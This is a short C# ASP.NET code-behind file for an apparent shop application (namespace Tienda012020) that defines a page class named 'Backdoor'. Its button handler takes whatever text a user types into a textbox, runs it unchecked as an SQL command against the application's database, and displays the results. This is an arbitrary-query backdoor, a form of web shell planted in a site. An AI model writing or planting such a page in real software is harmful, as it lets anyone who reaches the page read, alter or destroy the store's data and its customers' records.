using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Data.Odbc;

namespace Tienda012020
{
    public partial class Backdoor : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            
        }

        protected void Button1_Click(object sender, EventArgs e)
        {
            String query = TextBox1.Text;
            OdbcConnection conexion = new ConexionBD().con;
            OdbcCommand comando = new OdbcCommand(query, conexion);

            OdbcDataReader lector = comando.ExecuteReader();

            GridView1.DataSource = lector;
            GridView1.DataBind();
            conexion.Close();
        }
    }
}